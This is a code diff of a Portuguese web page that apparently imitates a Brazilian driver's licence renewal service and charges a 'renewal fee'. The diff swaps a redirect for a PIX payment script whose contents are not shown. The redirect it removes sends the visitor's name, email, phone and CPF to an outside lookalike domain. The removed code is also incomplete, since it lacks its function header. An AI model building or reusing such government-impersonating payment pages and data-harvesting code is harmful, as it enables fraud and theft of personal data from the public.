@@ -13,6 +13,9 @@
     <!-- Custom CSS -->
     <link rel="stylesheet" href="css/custom.css">
     
+    <!-- Script de Pagamento PIX -->
+    <script src="js/pix-payment.js"></script>
+    
     <!-- Favicon -->
     <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
 
@@ -161,7 +164,7 @@
                     Voltar
                 </a>
                 <div style="text-align: center;">
-                    <button onclick="redirecionarPagamento()" style="background-color: #28a745; color: white; font-size: 18px; padding: 12px 24px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;" id="9bccc0dd-65a1-d8b8-7078-8480aa6f59ee">
+                    <button onclick="processarPagamentoPIX()" style="background-color: #28a745; color: white; font-size: 18px; padding: 12px 24px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;" id="btn-pagar">
                         <i class="fas fa-credit-card mr-2"></i>
                         PAGAR TAXA DE RENOVAÇÃO
                     </button>
@@ -185,25 +188,6 @@
         </div>
 
         <script>
-            const CHECKOUT_URL = "https://seguro.renovacaocnhdigital.site/";
-                const dadosCpf = JSON.parse(localStorage.getItem('userData') || '{}');
-                const dadosCompletos = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
-                
-                const nome = dadosCompletos.nome || dadosCpf.nome || 'Usuário';
-                const email = dadosCpf.email || document.getElementById('email-usuario').value || '';
-                const telefone = dadosCpf.telefone || document.getElementById('telefone-usuario').value || '';
-                const cpf = dadosCompletos.cpf || dadosCpf.cpf || '';
-                
-                const sep = CHECKOUT_URL.includes('?') ? '&' : '?';
-
-                return window.location.href =
-                    CHECKOUT_URL + sep +
-                    'name=' + encodeURIComponent(nome) +
-                    '&email=' + encodeURIComponent(email) +
-                    '&telephone=' + encodeURIComponent(telefone) +
-                    '&document=' + encodeURIComponent(cpf);
-            }
-
             function preencherDadosUsuario() {
                 const dadosCpf = JSON.parse(localStorage.getItem('userData') || '{}');
                 const dadosCompletos = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
